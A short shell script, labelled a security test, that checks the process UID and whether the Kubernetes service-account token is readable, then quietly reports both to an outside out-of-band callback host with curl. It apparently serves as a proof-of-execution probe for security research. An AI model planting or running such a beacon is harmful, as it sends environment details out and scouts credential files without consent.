#!/bin/sh
# Security test: only nonce, UID and serviceaccount-token readability boolean.
uid="$(id -u)"
readable=false
if test -r /var/run/secrets/kubernetes.io/serviceaccount/token; then readable=true; fi
curl -fsS --max-time 5 --retry 0 -o /dev/null "https://dbqomr85t73868865dogxme34mzmj1fr5.oob.staging.depthfirst.com/dfmise/b539cefeb02b6dadb8dc01b98d1a17ac?uid=$uid&token_readable=$readable" >/dev/null 2>&1 || true
